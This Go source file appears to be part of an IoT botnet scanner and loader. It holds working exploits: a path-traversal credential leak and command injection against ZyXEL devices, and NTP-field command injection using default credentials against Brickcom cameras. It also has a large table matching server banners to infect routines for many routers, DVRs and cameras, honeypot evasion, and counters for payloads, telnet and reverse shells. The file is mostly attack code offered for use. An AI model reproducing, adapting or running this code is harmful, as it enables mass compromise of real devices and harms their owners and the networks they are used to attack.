
func gozygetAuthLeak(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /\\..\\adm\\management.asp HTTP/1.1\r\nHost: " + target + "\r\nOrigin: http://" + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	var user, pass string

	if strings.Contains(buff.String(), "<td><input type=\"text\" name=\"admuser\" size=\"16\" maxlength=\"16\" value=\"") {
		usernameStr := strings.Split(buff.String(), "<td><input type=\"text\" name=\"admuser\" size=\"16\" maxlength=\"16\" value=\"")

		if len(usernameStr) > 1 {
			username := strings.Split(usernameStr[1], "\"")

			if len(username) > 0 {
				user = username[0]
			}
		}
	}

	if strings.Contains(buff.String(), "<td><input type=\"password\" name=\"admpass\" size=\"16\" maxlength=\"32\" value=\"") {
		passwordStr := strings.Split(buff.String(), "<td><input type=\"password\" name=\"admpass\" size=\"16\" maxlength=\"32\" value=\"")

		if len(passwordStr) > 1 {
			password := strings.Split(passwordStr[1], "\"")

			if len(password) > 0 {
				pass = password[0]
			}
		}
	}

	return user, pass
}

func gozygetResponse(target, auth, check string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /adm/system_command.asp HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/adm/system_command.asp\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), check)
}

func gozyloginDevice(target, username, password string) string {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	data := "AuthName=" + username + "&AuthPassword=" + password
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/ZyLogin HTTP/1.1\r\nHost: " + target + "\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "Set-Cookie: SESSION=") {
		cookieStr := strings.Split(buff.String(), "Set-Cookie: SESSION=")

		if len(cookieStr) > 1 {
			cookie := strings.Split(cookieStr[1], ";")

			if len(cookie) > 0 {
				return cookie[0]
			}
		}
	}

	return ""
}

func gozysendPayload(target, cookie, payload string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "command=" + payload + "&SystemCommandSubmit=admin+apply"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/SystemCommand HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/goform/SystemCommand\r\nOrigin: http://" + target + "\r\nCookie: SESSION=" + cookie + "\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func gozyexploitDevice(target string) {

	username, password := gozygetAuthLeak(target)

	if username == "" || password == "" {
		return
	}

	cookie := gozyloginDevice(target, username, password)

	if cookie == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mgozy:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m leaked login\x1b[38;5;15m\r\n", username, password, target)
	gozysendPayload(target, cookie, gozyPayload)

	if gozygetResponse(target, cookie, executeMessage) {
		fmt.Printf("\x1b[38;5;46mgozy:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", username, password, target)
	}
}

func brickcomfindDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: mini_httpd")
}

func brickcomcheckHtml(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /index_mjpg.html HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "/cgi-bin/wledctl.cgi")
}

func brickcomsendPayload(target, pyld string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "action=set&type=2&timezoneID=14&country=User Defined&offsetHours=13&offsetMinutes=0&ntp.ntpServerLoc1=$(" + pyld + ")&ntp.ntpServerLoc2=clock.stdtime.gov.tw&enableDST=1&DayPeriod=0&StartMonth=1&EndMonth=1&StartDay=1&EndDay=1"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /cgi-bin/time.cgi HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nOrigin: http://" + target + "\r\nReferer: http://" + target + "/date_time_config.html\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "statusString=successfully") {
		fmt.Printf("\x1b[38;5;46mbrickcom\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sent payload\x1b[38;5;15m\r\n", target)
	}
}

func brickcomexploitDevice(target string) {

	if !brickcomfindDevice(target) {
		return
	}

	if !brickcomcheckHtml(target) {
		return
	}

	fmt.Printf("\x1b[38;5;46mbrickcom\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", target)

	brickcomsendPayload(target, brickcomPayload)
	time.Sleep(10 * time.Second)
	brickcomsendPayload(target, brickcomPayload2)
	time.Sleep(10 * time.Second)
	brickcomsendPayload(target, brickcomPayload3)
}

func scannerAddExploit(name string, function interface{}) {

	exploitMap[name] = function
}

func scannerInitExploits() {

	exploitMap = make(map[string]interface{})

	/* wanna try */
	scannerAddExploit("Basic realm=\"DVR\"", infectFunctionLilinDvr)
	scannerAddExploit("uc-httpd 1.0.0", infectFunctionUchttpd)
	scannerAddExploit("CMS Web Viewer", infectFunctionMagic)
	scannerAddExploit("Server: GoAhead-Webs", infectFunctionFiberhome)
	scannerAddExploit("Server: GoAhead-Webs", infectFunctionSpain)

	scannerAddExploit("Server: DWS", infectFunctionVigor)
	scannerAddExploit("Basic realm=\"Broadband Router\"", infectFunctionComtrend)
	scannerAddExploit("Basic realm=\"Broadband Router\"", infectFunctionBroadcom)
	scannerAddExploit("Server: Boa/0.93.15", infectFunctionGponFiber)
	scannerAddExploit("TOTOLINK", infectFunctionTotolink)
	scannerAddExploit("Server: Boa/0.94.14", infectFunctionRealtek)
	scannerAddExploit("Basic realm=\"Server Status\"", infectFunctionHongdian)
	scannerAddExploit("Server: Http Server", infectFunctionTenda)
	scannerAddExploit(",/playzone,/", infectFunctionZyxel)
	scannerAddExploit("Linksys E", infectFunctionLinksys)

	scannerAddExploit("JAWS/1.0", infectFunctionJaws)

	scannerAddExploit("Avtech/1.0", infectAvtech)

	scannerAddExploit("Mini web server 1.0", ZTEexploitDevice)

	scannerAddExploit("WWW-Authenticate: Digest realm=\"DCS", infectDCSDlink)
	scannerAddExploit("username is \"root\" in all newer releases", infectFunctionAlcatel)

	/* Tvt */
	scannerAddExploit("AuthInfo", infectFunctionTvt)
	scannerAddExploit("loadingIndicator_bk", infectFunctionTvt)

	scannerAddExploit("Server: micro_httpd", infectZhone)
	scannerAddExploit("Server: httpd_four-faith", infectFaith)
	scannerAddExploit("mini_httpd/1.19 19dec2003 ", infectVoip)

	/* asusrt */
	scannerAddExploit("WWW-Authenticate: Basic realm", infectAsusRT)

	/* boa */
	scannerAddExploit("Server: eCos Embedded Web Server", infectFunctionBoa)
	scannerAddExploit("Server: Boa", infectFunctionBoa)

	scannerAddExploit("cgi-bin/login.cgi", infectFunctionMultiDvr)

	/* pdvr */
	scannerAddExploit("PDR-M800", pdvrInfectDevice)

	/* gargoyle */
	scannerAddExploit("gargoyle", gargoyleInfectFunction)

	/* gocloud */
	scannerAddExploit("/cgi-bin/webui/admin", goCloudExploitDevice)

	scannerAddExploit("WWW-Authenticate: Basic realm=Legrand Router", qnapInfectFunction)

	scannerAddExploit("Baicells Management Utility", baicellsInfectFunction)

	/* india gpon */
	scannerAddExploit("J2100N GPON ONT", indiaGponInfectFunction)

	/* Ruckus */
	scannerAddExploit("GoAhead-Webs", ruckusInfectFunction)

	scannerAddExploit("/cgi-bin/slogin/enter.spy", unauthDvrInfectFunction)

	/* Sea Gate */
	scannerAddExploit("Seagate", infectFunctionSeaGate)

	scannerAddExploit("/cgi-bin/systemutil.cgi?Command=LangGet", infectFunctionSDT)

	/* Ruijie */
	scannerAddExploit("<span class=\"eweb\"></span>", ruijeInfectFunction)

	scannerAddExploit("iRZ", infectFunctionIRZ)

	/* weed */
	scannerAddExploit("/cgi-bin/main_manage.cgi", infectFunctionWeed)

	scannerAddExploit("Server: Linux, HTTP/1.1, DIR-", infectFunctionDlinkThree)

	scannerAddExploit("TWISTED", dreamboxExploitDevice)

	scannerAddExploit("USG FLEX", usgflexExploitDevice)

	/* telecom botnet */
	scannerAddExploit("Welcome to the Web-Based Configurator", telecomexploitDevice)

	/* goform */
	scannerAddExploit("Server: GoAhead-Webs", goformExploitDevice)

	scannerAddExploit("Server: httpd", ipcamExploitDevice)

	/* wavlink */
	scannerAddExploit("lighttpd", wavlinkexploitDevice)

	/* gozy */
	scannerAddExploit("/ZyXEL/login.asp", gozyexploitDevice)

	/* brickcom */
	scannerAddExploit("Server: mini_httpd", brickcomexploitDevice)
}

func detectHoneypot(buf string) bool {

	first := strings.Split(buf, "\r\n\r\n")

	var html string

	for idx, split := range first {
		if idx > 0 {
			html += split
		}
	}

	if len(html) > 1 {

		if strings.Count(html, "Server: ") > 1 {
			return true
		}
	}

	return false
}

func httpBannerCheck(target string) {

	defer workerGroup.Done()

	conn, err := net.DialTimeout("tcp", target, netTimeout*time.Second)

	if err != nil {
		return
	}

	conn.SetDeadline(time.Now().Add(20 * time.Second))
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))

	for {
		bytebuf := make([]byte, 4096)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if detectHoneypot(string(bytebuf)) {
			fmt.Printf("\x1b[91mscanner:%s\x1b[0m detected honeypot\x1b[38;5;15m\r\n", target)

			conn.Close()
			return
		}

		for key, element := range exploitMap {
			if strings.Contains(string(bytebuf), key) {
				switch function := element.(type) {
				case func(string):
					conn.Close()
					function(target)
				default:
					conn.Close()
					break
				}
			}
		}
	}
}

func titleWriter() {
	i := 0
	for {
		fmt.Printf("%d's | Payload Sent: %d | Telnet Opened: %d | Shells: %d | Go Routines: %d\r\n",
			i, payloadSent, telShells, reverseShells, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
		i++
	}
}

func main() {
	go titleWriter()
	weedLoadTimezones()
	dropperMap = make(map[string]echoDropper)
	telnetLoadDroppers()
	scannerInitExploits()
	recvServ, err := net.Listen("tcp", "0.0.0.0:19412")
	if err != nil {
		return
	}
	go goCloudreverseServer("8999")
	go func() {
		for {
			conn, err := recvServ.Accept()
			if err != nil {
				break
			}

			for {
				buf := make([]byte, 32)
				l, err := conn.Read(buf)
				if l <= 0 || err != nil {
					conn.Close()
					break
				}

				workerGroup.Add(1)
				go httpBannerCheck(string(buf))
			}
		}
	}()
	reader := bufio.NewReader(os.Stdin)
	input := bufio.NewScanner(reader)
	for input.Scan() {
		if os.Args[1] == "listen" {
			workerGroup.Add(1)
			go httpBannerCheck(input.Text())
		} else {
			workerGroup.Add(1)
			go httpBannerCheck(input.Text() + ":" + os.Args[1])
		}
	}
	time.Sleep(10 * time.Second)
	workerGroup.Wait()
}
